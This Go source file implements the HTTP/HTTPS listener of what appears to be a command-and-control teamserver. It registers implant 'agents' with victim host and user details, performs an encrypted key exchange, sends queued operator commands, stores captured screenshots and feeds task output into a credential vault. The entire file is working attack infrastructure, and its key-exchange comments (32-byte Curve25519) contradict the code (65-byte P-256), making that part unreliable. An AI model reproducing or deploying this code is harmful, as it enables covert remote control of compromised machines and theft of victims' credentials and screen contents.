package listeners

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/rs/zerolog/log"

	"apex/teamserver/internal/agents"
	apexcrypto "apex/teamserver/internal/crypto"
	"apex/teamserver/internal/credentials"
	"apex/teamserver/internal/tasks"
)

// Use detached context for DB/background work so agent disconnect doesn't cancel it.
var bgctx = context.Background()

type HTTPListener struct {
	config   Config
	server   *http.Server
	checkins chan CheckIn
	agents   *agents.Manager
	tasks    *tasks.Queue
	creds    *credentials.Vault
	sessions *apexcrypto.SessionStore
	running  bool
	mu       sync.RWMutex
}

func NewHTTP(cfg Config, agentMgr *agents.Manager, taskQueue *tasks.Queue, credVault *credentials.Vault) *HTTPListener {
	return &HTTPListener{
		config:   cfg,
		checkins: make(chan CheckIn, 256),
		agents:   agentMgr,
		tasks:    taskQueue,
		creds:    credVault,
		sessions: apexcrypto.NewSessionStore(),
	}
}

func (h *HTTPListener) ID() string              { return h.config.ID }
func (h *HTTPListener) Name() string             { return h.config.Name }
func (h *HTTPListener) Protocol() Protocol       { return h.config.Protocol }
func (h *HTTPListener) BindAddress() string      { return h.config.BindAddress }
func (h *HTTPListener) BindPort() int            { return h.config.BindPort }
func (h *HTTPListener) CheckIns() <-chan CheckIn { return h.checkins }

func (h *HTTPListener) IsRunning() bool {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.running
}

func (h *HTTPListener) Start(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", h.handleCheckIn)

	addr := fmt.Sprintf("%s:%d", h.config.BindAddress, h.config.BindPort)
	h.server = &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		BaseContext:  func(_ net.Listener) context.Context { return context.Background() },
	}

	h.mu.Lock()
	h.running = true
	h.mu.Unlock()

	log.Info().
		Str("protocol", string(h.config.Protocol)).
		Str("addr", addr).
		Str("name", h.config.Name).
		Msg("Listener started")

	var err error
	if h.config.Protocol == ProtocolHTTPS {
		certFile := h.config.Options["cert_file"]
		keyFile := h.config.Options["key_file"]
		certPath, keyPath, genErr := ensureTLSCerts(certFile, keyFile, h.config.ID)
		if genErr != nil {
			h.mu.Lock()
			h.running = false
			h.mu.Unlock()
			return fmt.Errorf("tls setup: %w", genErr)
		}
		h.server.TLSConfig = &tls.Config{MinVersion: tls.VersionTLS12}
		err = h.server.ListenAndServeTLS(certPath, keyPath)
	} else {
		err = h.server.ListenAndServe()
	}

	if err != nil && err != http.ErrServerClosed {
		h.mu.Lock()
		h.running = false
		h.mu.Unlock()
		return fmt.Errorf("listener serve: %w", err)
	}
	return nil
}

func (h *HTTPListener) Stop(ctx context.Context) error {
	h.mu.Lock()
	defer h.mu.Unlock()

	if h.server != nil {
		if err := h.server.Shutdown(ctx); err != nil {
			return fmt.Errorf("listener shutdown: %w", err)
		}
	}
	h.running = false

	log.Info().Str("name", h.config.Name).Msg("Listener stopped")
	return nil
}

// ── Wire types ────────────────────────────────────────────────────────────────

type agentSysinfo struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	PID         int    `json:"pid"`
	ProcessName string `json:"process_name"`
	InternalIP  string `json:"internal_ip"`
	Sleep       int    `json:"sleep"`
	Jitter      int    `json:"jitter"`
}

// checkInRequest is the plaintext JSON sent by the agent on first check-in.
// PubKey is the base64-encoded 32-byte Curve25519 public key.
type checkInRequest struct {
	Sysinfo *agentSysinfo       `json:"sysinfo,omitempty"`
	PubKey  string              `json:"pubkey,omitempty"`
	Results []taskResultPayload `json:"results,omitempty"`
}

type taskResultPayload struct {
	TaskID  string `json:"task_id"`
	Output  string `json:"output"` // base64
	Success bool   `json:"success"`
}

// checkInResponse is the plaintext JSON sent back on first check-in.
// ServerPubKey and KexNonce are only present during key exchange.
type checkInResponse struct {
	AgentID     string         `json:"agent_id,omitempty"`
	ServerPubKey string        `json:"server_pubkey,omitempty"`
	KexNonce    string         `json:"kex_nonce,omitempty"`
	Tasks       []taskResponse `json:"tasks,omitempty"`
}

type taskResponse struct {
	ID        string `json:"id"`
	Command   string `json:"command"`
	Arguments string `json:"arguments"` // base64
}

// ── Handler ───────────────────────────────────────────────────────────────────

func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	rawBody, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		agentID = r.Header.Get("X-Request-ID")
	}
	if agentID == "" {
		agentID = r.URL.Query().Get("id")
	}

	log.Debug().
		Str("remote", r.RemoteAddr).
		Str("agent_id", agentID).
		Int("body_len", len(rawBody)).
		Msg("Listener: incoming request")

	externalIP, _, _ := net.SplitHostPort(r.RemoteAddr)

	// Emit for legacy consumers (e.g. events)
	select {
	case h.checkins <- CheckIn{AgentID: agentID, ExternalIP: externalIP, Data: rawBody}:
	default:
	}

	// ── If the body is encrypted, decrypt it first ─────────────────────────────
	encrypted := r.Header.Get("X-Encrypted") == "1"
	body := rawBody

	if encrypted && agentID != "" {
		sessionKey, ok := h.sessions.Get(agentID)
		if !ok {
			log.Warn().Str("agent_id", agentID).Msg("Encrypted request from unknown agent — dropping")
			http.Error(w, "unknown agent", http.StatusUnauthorized)
			return
		}
		plain, err := apexcrypto.GCMDecrypt(sessionKey, string(rawBody))
		if err != nil {
			log.Warn().Err(err).Str("agent_id", agentID).Msg("GCM decryption failed")
			http.Error(w, "decryption failed", http.StatusBadRequest)
			return
		}
		body = plain
		log.Debug().Str("agent_id", agentID).Int("plain_len", len(body)).Msg("Decrypted agent body")
	}

	// ── Parse JSON body ────────────────────────────────────────────────────────
	var req checkInRequest
	if len(body) > 0 {
		_ = json.Unmarshal(body, &req)
	}

	// ── First-time registration: no agent ID, body has sysinfo + pubkey ────────
	if agentID == "" && req.Sysinfo != nil {
		h.handleRegistration(w, r, req, externalIP)
		return
	}

	// Returning agent: must have ID
	if agentID == "" {
		http.Error(w, "missing agent id", http.StatusBadRequest)
		return
	}

	// ── Process task results ───────────────────────────────────────────────────
	for _, res := range req.Results {
		out, _ := base64.StdEncoding.DecodeString(res.Output)

		// Detect binary screenshot data (BMP magic "BM") and save to file
		if len(out) > 2 && out[0] == 'B' && out[1] == 'M' {
			dir := filepath.Join("data", "screenshots")
			_ = os.MkdirAll(dir, 0755)
			fname := fmt.Sprintf("%s_%s.bmp", agentID[:8], time.Now().Format("20060102_150405"))
			fpath := filepath.Join(dir, fname)
			if err := os.WriteFile(fpath, out, 0644); err == nil {
				out = []byte(fmt.Sprintf("Screenshot saved to %s (%d bytes)", fpath, len(out)))
				log.Info().Str("agent_id", agentID).Str("path", fpath).Msg("Screenshot captured and saved")
			}
		}

		tr := &tasks.TaskResult{
			TaskID:    res.TaskID,
			AgentID:   agentID,
			Output:    out,
			Success:   res.Success,
			Timestamp: time.Now(),
		}
		_ = h.tasks.PublishResult(bgctx, tr)
		h.agents.BroadcastTaskResult(agentID, tr)

		if h.creds != nil && res.Success && len(out) > 0 {
			h.creds.ParseOutput(bgctx, agentID, "task:"+res.TaskID, string(out))
		}

		log.Debug().
			Str("agent_id", agentID).
			Str("task_id", res.TaskID).
			Int("output_len", len(out)).
			Bool("success", res.Success).
			Msg("Task result received and broadcast")
	}

	h.agents.CheckIn(agentID)

	// ── Dequeue pending tasks ──────────────────────────────────────────────────
	pending, err := h.tasks.Dequeue(bgctx, agentID)
	if err != nil {
		log.Warn().Err(err).Str("agent_id", agentID).Msg("Task dequeue failed")
	}

	respTasks := make([]taskResponse, 0, len(pending))
	for _, t := range pending {
		argsB64 := ""
		if len(t.Arguments) > 0 {
			argsB64 = base64.StdEncoding.EncodeToString(t.Arguments)
		}
		respTasks = append(respTasks, taskResponse{
			ID:        t.ID,
			Command:   t.Command,
			Arguments: argsB64,
		})
		log.Debug().
			Str("agent_id", agentID).
			Str("task_id", t.ID).
			Str("command", t.Command).
			Msg("Task delivered to agent")
	}

	// ── Build and send response (encrypted if session exists) ─────────────────
	h.writeResponse(w, agentID, checkInResponse{Tasks: respTasks})
}

// handleRegistration processes a first-time check-in: registers the agent and
// performs the Curve25519 ECDH key exchange.
func (h *HTTPListener) handleRegistration(w http.ResponseWriter, r *http.Request, req checkInRequest, externalIP string) {
	s := req.Sysinfo
	if s.Sleep <= 0 {
		s.Sleep = 60
	}
	if s.Jitter <= 0 {
		s.Jitter = 15
	}

	agent := &agents.Agent{
		ID:          uuid.New().String(),
		Hostname:    s.Hostname,
		Username:    s.Username,
		OS:          s.OS,
		Arch:        s.Arch,
		PID:         s.PID,
		ProcessName: s.ProcessName,
		InternalIP:  s.InternalIP,
		ExternalIP:  externalIP,
		Sleep:       s.Sleep,
		Jitter:      s.Jitter,
		ListenerID:  h.config.ID,
	}

	registered, reused, err := h.agents.RegisterOrReuse(bgctx, agent, 24*time.Hour)
	if err != nil {
		log.Error().Err(err).Msg("Failed to register agent")
		http.Error(w, "registration failed", http.StatusInternalServerError)
		return
	}
	if reused {
		log.Debug().
			Str("existing_id", registered.ID).
			Str("hostname", s.Hostname).
			Msg("Returning existing agent_id (dedupe)")
	}

	resp := checkInResponse{AgentID: registered.ID}

	// ── ECDH key exchange ──────────────────────────────────────────────────────
	if req.PubKey != "" {
		agentPubBytes, err := base64.StdEncoding.DecodeString(req.PubKey)
		if err == nil && len(agentPubBytes) == 65 {
			serverPriv, serverPub, err := apexcrypto.GenerateKeypair()
			if err != nil {
				log.Error().Err(err).Msg("ECDH keypair generation failed")
			} else {
				var nonce [32]byte
				if _, err := rand.Read(nonce[:]); err != nil {
					log.Error().Err(err).Msg("nonce generation failed")
				}

				sessionKey, err := apexcrypto.DeriveSessionKey(serverPriv, agentPubBytes, nonce)
				if err != nil {
					log.Error().Err(err).Msg("Session key derivation failed")
				} else {
					h.sessions.Set(registered.ID, sessionKey)
					resp.ServerPubKey = base64.StdEncoding.EncodeToString(serverPub)
					resp.KexNonce = base64.StdEncoding.EncodeToString(nonce[:])
					log.Info().
						Str("agent_id", registered.ID).
						Msg("ECDH-P256 key exchange completed — session established")
				}
			}
		} else {
			log.Warn().Str("agent_id", registered.ID).Msg("Agent sent invalid pubkey length — no encryption")
		}
	}

	// Registration response is always plaintext (session being established now)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// writeResponse JSON-encodes resp and, if an encryption session exists for
// agentID, sends the body as base64(GCM-encrypted JSON). Otherwise plain JSON.
func (h *HTTPListener) writeResponse(w http.ResponseWriter, agentID string, resp checkInResponse) {
	plainJSON, err := json.Marshal(resp)
	if err != nil {
		http.Error(w, "marshal error", http.StatusInternalServerError)
		return
	}

	sessionKey, ok := h.sessions.Get(agentID)
	if ok {
		blob, err := apexcrypto.GCMEncrypt(sessionKey, plainJSON)
		if err != nil {
			log.Error().Err(err).Str("agent_id", agentID).Msg("GCM encrypt response failed — falling back to plaintext")
			// fall through to plaintext
		} else {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("X-Encrypted", "1")
			fmt.Fprint(w, blob)
			return
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(plainJSON)
}
